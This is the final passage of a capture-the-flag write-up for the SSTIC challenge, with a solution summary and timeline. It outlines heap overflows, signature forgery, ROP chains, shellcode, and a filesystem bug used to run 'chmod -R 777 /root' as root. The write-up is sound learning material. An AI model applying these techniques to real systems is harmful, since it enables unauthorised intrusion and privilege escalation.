kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;      .,oxkOOOOkdc'      .lOOOOOOOOOOOOOOl      .cOOOOOOOOOOOOOk;      'O0O0000000000                      .:O000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkc,.     .........      .;oOOOOOOOOOOOOOOd      .oOOOOOOOOOOOOOOOO:      o000000000000                        .cO0000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOd:.               .,cxOOOOOOOOOOOOOOOO.     .xOOOOOOOOOOOOOOOOOO;     .O00000000000     ..,,;;;;,'.          'O000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkkoc;.                .;cxOOOOOOOOOOOOOOo      lOOOOOOOOOOOOOOOOOOOx      d00000000000.';coxkOO0000Okxoc,.       .k00000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;.        .....         .cOOOOOOOOOOOOO,      OOOOOOOOOOOOOOOOOOOO0.     c00000000000kO00000000000000000d'       ,00000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkc.      .,:coododlc:'.      'oOOOOOOOOOOO      .lllllllllllllllllllll.     ;0000000000000000000000000000000O;       o0000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkc       ;xOOOOOOOOOOOko'      .dOOOOOOOOOx                                  ,00O000000000000000000000000000000;      .0000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.      ;kkOOOOOOOOOOOOOx.      'OOOOOOOOOd                                  ,000000000000000000000000000000000x       O000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk'      ,kOOOOOOOOOOOOOOOOd.      lOOOOOOOOd                                  ,0000000000000000000000000000000000.      d000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx       kkOOOOOOOOOOOOOOOOOo      .OOOOOOOOd      .;;;;;;;;;;;;;;;;;;;;;;;;;;;o0000000000000000000000000000000000c      l000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkl      .OOOOOOOOOOOOOOOOOOOk       kOOOOOOOx      :OOOOOOOOOOOOOOOOOOOO0O00O0000000000000000000000000000000000000l      l000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkc      :OkOOOOOOOOOOOOOOOOOO       xOOOOOOOO      .OOOOOOOOOOOOOOOOOOOOO0O0O0000000000000000000000000000000000000:      l000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkl      ,OOOOOOOOOOOOOOOOOOOk       kOOOOOOOO,      dOOOOOOOOOOOOOOOOOOO0000O000000000000000000000000000000000000O.      x000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko       kOOOOOOOOOOOOOOOOOOd       OOOOOOOOOd      .OOOOOOOOOOOOOOOOOOO0O0OO000000000000000000000000000000000000c       O000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk       :kOOOOOOOOOOOOOOOOk'      'OOOOOOOOOO'      ;kOOOOOOOOOOOOOOOOO0O0O00000000000000000000000000000000000Ol       ;0000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;       lOkOOOOOOOOOOOOOk;       dOOOOOOOOOOx.      ,kOOOOOOOOOOOOOOOOO0O0OkO00O000000OdO0000000000000000000O:        O0000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd       .lkOOOOOOOOOOOOk;       .kOOOOOOOOOOOc       ,xOOOOOOOOOOOOOOOO0Oxl,x000000000x.;dk0000000000000000x:        :00000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk:        ':ldxkkkkxdc:.       .oOOOOOOOOOOOOk:.      .;coxkkkOOkkkxdlc;'.  x000000000x  ..';cllddxkkxxol:,.        ;O00000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkc          ..,,,'..         .dOOOOOOOOOOOOOOOo.         .',,;;,,'..       x000000000x         .......           .l0000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkc,.                      .;dOOOOOOOOOOOOOOOOOx:.                         x000000000x                         .;d00000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkko'.                  .:dOOOOOOOOOOOOOOOOOOOOOkl'.                   .,cO0O0000000k'.                     ':k0000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkdc:;'..........,;:lxOOOOOOOOOOOOOOOOOOOOOOOOOkoc:;...........,;:loxO0O0000000000kxoc:;;'..........';:ldk000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOkxxxxxxxkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkkkkkkkOOOOO0O0O0O0O00000000000000000kOkOkkOOO000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O0000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00O0O00000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00000000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O00000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0000000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O00O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0OO00000O000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O00000O000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00000000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0O00O0O000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O0000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00000O00000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O00O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0OO0O0O0000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO00O0O000000000000000000000000000000000000000000000000000000
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOkkOOkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0O0OO0O00O0000000000000000000000000000000000000000000000

```

Ah, that looks like a message! To make it easier to read, I translated this into an image, using the byte values as pixel intensities:

![The transmission from `final_secret.txt`, viewed as an 1171x89 image](files/stage6/final_secret_image.png)

We can easily read off the email address to complete the challenge: `8e5f4c6f87ff54cdffad@sstic.org`. Challenge complete!

## Solution Summary

This is a quick summary of the solution; for details, consult the relevant sections of the writeup.

1. [Stage 1](#stage-1)
    1. Use Hachoir to view the `.doc` file. Observe lots of "unparsed" segments indicating hidden data.
    2. Use Binwalk to find a gzip header.
    3. Write [a parser](files/stage1/parse.py) to walk the OLE2 FAT tables and extract the chain starting with the gzip header.
    4. Uncompress the resulting [`.tar.gz`](files/stage1/hidden.tgz); flag is in [`e4r7h.txt`](chall/release/e4r7h.txt).
2. [Stage 2](#stage-2)
    1. Extract [`initramfs.img`](chall/release/initramfs.img).
    2. Reverse [the FTP server binary](chall/initramfs/home/sstic/server) and identify several bugs:
        1. A bug that enables changing the authentication type and provoking a type confusion
        2. A bug that allows leaking some signatures from the HSM along with an executable address (defeating PIE)
        3. A large heap overflow bug
        4. A potential use-after-free bug
    3. Reverse [the HSM binary](chall/release/chall.hex) to extract the signing algorithm.
    4. Reimplement the signing algorithm [in Python](files/stage2/hsm_test.py).
    5. Develop [a mathematical attack](files/stage2/hsm_solve.sage) which recovers the signing key by using leaks from the signature leak bug.
    6. Use the attack to recover signing keys and forge a valid CERT message with higher permissions ([`exploit2.py`](files/stage2/exploit2.py)) and read [the secret file](files/stage2/secret.txt) for the flag.
3. [Stage 3](#stage-3)
    1. Use the type confusion bug to leak a heap pointer.
    2. Use the heap overflow bug to corrupt a Cert object so we can leak the contents of a GOT entry (leaking libc)
    3. Use libc gadgets to build a ropchain. Overwrite a function pointer on the Cert object (signed with the recovered keys) to trigger the ropchain.
    4. [The exploit](files/stage3/exploit3.py) uses the ropchain to read [yet another secret file](files/stage3/m00n.txt), yielding the stage 3 flag.
4. [Stage 4](#stage-4)
    1. Use [another ropchain](files/stage4/lsdir.py) to list the contents of `/home/sstic/sensitive` and find [`home_backup.tar.zz`](files/stage4/home_backup.tar.zz).
    2. Use [yet another ropchain](files/stage4/getfile.py) to retrieve this file, and guess that it was compressed with the provided `zz` binary.
    3. Reverse the `zz` binary, mostly with static reversing, to figure out how it compresses files.
        1. This involves [disassembling](files/stage4/zzdisas.py) and [reversing](files/stage4/zzdisas.main.txt) a weird virtual machine where opcodes are relative program addresses.
        2. The program also executes 32-bit Intel code via the "Heaven's Gate" technique to supply yet another weird virtual machine.
    4. [Implement a decompressor](files/stage4/unzz.py) which spits out the uncompressed [`home_backup.tar`](files/stage4/home_backup.tar).
    5. Decompress the .tar file and find the flag in [`notes.txt`](chall/home_backup/notes.txt).
5. [Stage 5](#stage-5)
    1. Obtain the password to mount the goodfs filesystem in [`.bash_history`](chall/home_backup/.bash_history).
    2. Reverse both [`mounter_client`](chall/initramfs/bin/mounter_client) and [`mounter_server`](chall/initramfs/bin/mounter_server) to figure out how they communicate.
    3. Get shellcode execution in the FTP server, not just ropchains, by writing to and `mmap`'ing temporary files.
    4. [Mount the goodfs filesystem](files/stage5/shellcode1.c). Read a hint about `mark_buffer_dirty` from [`/mnt/goodfs/public/todo.txt`](files/stage5/goodfs/todo.txt).
    5. Reverse the filesystem driver, [`goodfs.ko`](chall/initramfs/goodfs.ko), and find the missing `mark_buffer_dirty` calls.
    6. Using the missing `mark_buffer_dirty` calls, [corrupt the filesystem](files/stage5/shellcode2.c) and obtain direct access to the contents of inode #3.
    7. Read [inode #3](files/stage5/goodfs/note.txt) to get the stage 5 flag.
6. [Stage 6](#stage-6)
    1. Reverse `goodfs` a bit further to identify the "negative inode" vulnerability.
    2. Examine `mounter_server` carefully to see how it can be attacked via targeted heap overwrites from a "negative inode" page.
    3. [Build an exploit](files/stage6/shellcode4.c) which allocates lots of dummy memory so that the `mounter_server` heap will be adjacent to the goodfs disk block 0, then overwrites the heap during unmount by editing negative inodes
    4. Use the heap overwrite to corrupt the stack in `mounter_server` via a stack overflow, and use this to directly execute shellcode (NX is off).
    5. Use the shellcode to `chmod -R 777 /root`, thereby enabling access to [`/root/final_secret.txt`](files/stage6/final_secret.txt), which contains the stage 6 flag.
7. [Final Stage](#final-stage)
    1. Reformat the "transmission" in `final_secret.txt` as a sequence of fixed-length lines
    2. Read the image formed in the resulting text file (without word wrapping) to obtain the email address.

## Timeline

Here's an approximate timeline of my solution process, reconstructed via web browsing history, terminal logs, file timestamps, and Git commits. All times are local (GMT-7).

### Friday April 1

- 10:21 am: During a work break, download [`Recette.doc`](chall/Recette.doc).
- 10:24 am: Using Hachoir, extract the data of `property[4]`, which turns out to just be a picture of an apple pie.
- 10:36 am: Run `binwalk` and identify a GZip header at offset 0x1e6200. Fail to extract the GZip starting at that offset.
- 10:38 am - 10:47 am: Write the [`parse.py`](files/stage1/parse.py) script to extract the file from the FAT. This works and spits out a usable `hidden.gz` file.
- 10:50 am: Figure out it's a `tar.gz` and extract it, finding the flag.
- 10:51 am: **Submit stage 1 flag**.
- 10:56 am: Unpack initramfs. Open [`server`](chall/initramfs/home/sstic/server) in Ghidra. No time to reverse it.
- 11:00 am - 6:30 pm: Work
- 3:10 pm: During a brief break, extract and decode the seccomp rules from `server`.
- 6:30 pm - 7:00 pm: Install qemu, patch simavr so it compiles without OpenGL, and get the release package running locally.
- 9:00 pm: Resume working on SSTIC. Try getting the server binary to run outside of QEMU. Build a dummy HSM using Python's `pty` module to simulate a real serial device.
- 9:15 pm: Start working on a client for the FTP server. Continue reversing it.
- 9:30 pm: Identify the base64 overflow bug in `CERT` and the one-null-byte overflow in `handleClientFTPServer`.
- 10:08 pm: Start reversing the HSM [`chall.hex`](chall/release/chall.hex) file.

### Saturday April 2

- 12:09 am: HSM reversing is almost done. Start reimplementing it in Python.
- 12:24 am: Finished a reimplementation of the HSM in Python. Time to sleep.
- 11:00 am: Resume work. Decide to start looking at the `zz` binary even though I have no idea what it's for yet.
- 11:34 am: Start writing a disassembler for the weird VM inside `zz`.
- 12:33 pm: All three VM programs starting at 0x130c0 disassembled completely.
- 1:30 pm: Decide that I should focus on the FTP server for now. Research heap exploit techniques that may be applicable.
- 2:00 pm: Figure out that it's feasible to leak signatures via the username `strncpy` and start working on recovering the HSM keys from the leak.
- 2:36 pm: Figure out that the HSM is implementing a simple operation in GF(2<sup>64</sup>). Implement a solver in Sage.
- 3:25 pm: Exploit complete.
- 3:27 pm: **Submit stage 2 flag**. Start working immediately on a full exploit of the server, since I have all the bugs and can now forge certificates.
- 5:21 pm: Get ROP. Start working on a ropchain to finish the exploit.
- 5:45 pm: Start trying to read [`sensitive/m00n.txt`](files/stage3/m00n.txt).
- 5:57 pm: **Submit stage 3 flag**.
- 6:16 pm: Start reversing the GoodFS pieces: [`mounter_client`](chall/initramfs/bin/mounter_client), [`mounter_server`](chall/initramfs/bin/mounter_server) and [`goodfs.ko`](chall/initramfs/goodfs.ko).
- 6:41 pm: Extract [`todo.txt`](files/stage5/goodfs/todo.txt) and [`placeholder`](files/stage5/goodfs/placeholder) from the provided GoodFS [`devices/sdb`](chall/initramfs/devices/sdb) file.
- 9:00 pm: Go back to reversing `zz`. 
- 10:16 pm: Realize I don't know what `home_backup.tar` is. Start writing a `getdents64` ropchain to list the remote filesystem.
- 11:01 pm: Find `home_backup.tar.zz` in the `sensitive` directory. Start writing another ropchain to retrieve the file.
- 11:49 pm: Successfully retrieve [`home_backup.tar.zz`](files/stage4/home_backup.tar.zz). Realize that `zz` is a compression program - a lot more things make sense now.

### Sunday April 3

- 12:05 am: Making rapid progress on reversing `zz` and the weird VM.
- 12:42 am: Figure out that literals are stored in a heap, and infer that this is an algorithm for building a Huffman tree.
- 1:20 am: Start writing a `.zz` parser/decompressor.
- 1:59 am: Finish parsing the literals array.
- 2:24 am: Discover the "heaven's gate" construct that switches into 32-bit mode. Start disassembling the 32-bit "VM".
- 2:49 am: Disassemble enough of the 32-bit VM to determine that it's just outputting the match literals table, and extract the relevant Huffman parameters.
- 3:13 am: Complete the decompressor and recover [`home_backup.tar`](files/stage4/home_backup.tar).
- 3:15 am: **Submit stage 4 flag**.
- 3:48 am: In order to mount the goodfs, I'll need shellcode to interact with the `mount_shm`. Start modifying my exploit to provide shellcode execution.
- 4:20 am: Write a program to run shellcode directly in my local QEMU so we don't need to keep exploiting the FTP server, with the exact same seccomp configuration as the real FTP server.
- 4:50 am: Get shellcode execution working remotely. Start reversing `goodfs.ko`.
- 5:47 am: Write a stager so we can load even more shellcode.
- 6:30 am: Sleep.
- 12:15 pm: Back at it. Give myself a root shell in the local QEMU via a netcat socket.
- 12:49 pm: Switch to using IDA for `goodfs.ko` because Ghidra is having trouble with some of the DWARF data type definitions. Continue reversing.
- 2:38 pm: Start putting together an exploit to abuse the missing `mark_buffer_dirty` calls.
- 3:14 pm: Realize that I need to change the time on a parent directory to prevent `goodfs_create` call from propagating an `mtime` change to the root inode and updating it.
- 3:25 pm: Complete the exploit.
- 3:27 pm: Exploit works remotely, secret file [`note.txt`](files/stage5/goodfs/note.txt) extracted.
- 3:37 pm: **Submit stage 5 flag**.
- 4:11 pm: Continuing to find more bugs and figure out the next exploit. Can we plant a binary that will be called as root? (e.g. setuid, `call_usermodehelper`, or binary called by the `mounter_server`?)
- 6:14 pm: Continuing to figure out what to do. Maybe we can corrupt the filesystem badly enough to trigger a bug in VFS?
- 7:41 pm: Gain the ability to write directory entries directly (have a file and a directory both sharing the same block storage).
- 8:26 pm: Just doing some refactoring/cleanup to make future exploits easier to write
- 10:00 pm: Can we call `execve` in 32-bit mode from shellcode? (No: `libseccomp` checks the architecture).
- 10:52 pm: Manage to get some useless kernel crashes: one NULL pointer deref from calling `unlink` on a file after it's been corrupted out of the parent directory (so it's in the dentry cache but not in the goodfs block), and a second weird crash from trying to switch to 32-bit mode (`supervisor write access in user mode`).
- 11:30 pm: Sleep; work next morning.

Over the next four days, I occasionally poke at the problem when I get time away from work and in the evenings, researching various kernel bugs and exploits for bad filesystems. Unfortunately, most such exploits assume you can make `setuid` root binaries, but our inability to `execve` precludes all of these. At some point, I did think about exploring negative inodes, but made an incorrect assumption about the C division operator and did not believe it was exploitable. I also got a good kernel debugging setup going.

### Friday April 8

On this day, I had several meetings throughout the day, as well as teaching, so I was mostly coding during breaks in my day from 9:00am - 4:30pm.

- 11:00 am: The SSTIC organizers release a hint.
- 11:08 am: Dump the new secret file and read the "negative inode" hint. Immediately realize that I've probably misunderstood the inode reading code.
- 11:17 am: Identify the weakness in `goodfs_write_inode` that permits a write to the page immediately preceding the `buffer_head`'s `b_data` page.
- 11:38 am: Exploring negative inodes.
- 12:38 pm: Augmented my shellcode program to show all `stat` output for a given file, so we can see the data leaked from the negative inode page.
- 1:26 pm: Augmented my shellcode to dump all valid negative inodes, while also watching `__alloc_pages` calls in GDB.
- 3:31 pm: Use the memory leak in `mounter_server` to reliably get `mounter_server`'s latest heap allocation to come from the "negative inode" page. It's now clear that we can exploit `mounter_server` by corrupting the heap-allocated strings when writing back negative inodes.
- 5:47 pm: Start exploring ROP gadgets in `mounter_server`. Find the perfect gadget: `jmp rdi` at 0x004016ed, to be used to overwrite the syslog function pointer on the stack. This works great because the heap is executable.
- 6:06 pm: Patch `mounter_server` so it performs fewer checks, to make the exploit easy to trigger and debug.
- 7:13 pm: Start writing the shellcode that will be executed in `mounter_server`. The initial approach was to execute a shell connected to the FTP server's socket, but that did not work because the busybox shell won't redirect to `/proc/<pid>/fd/5` when that's connected to a socket.
- 7:50 pm: Rewrite the shellcode to just execute `chmod -R 777 /root` instead.
- 7:53 pm: Got the exploit working locally.
- 8:02 pm: Got the exploit working remotely!
- 8:06 pm: **Submit stage 6 flag**.
- 8:10 pm: Try to decode the weird message. Realize it's truncated, and try to dump the whole file.
- 8:21 pm: Recover the entire [`final_secret.txt`](files/stage6/final_secret.txt) file.
- 8:25 pm: Reformat the [text as lines](files/stage6/final_secret_lines.txt) and recover the [image of the email address](files/stage6/final_secret_image.png).
- 8:26 pm: **Email `8e5f4c6f87ff54cdffad@sstic.org` to complete the challenge**.

## Conclusion

This year's challenge was fantastic. I especially loved the incredible subtlety of the "negative inode" bug, and how it could enable the compromise of the root `mounter_server` process. The range of different skills and concepts required for this competition continue to be a great learning opportunity, and I thoroughly enjoyed every step. I look forward to next year's edition!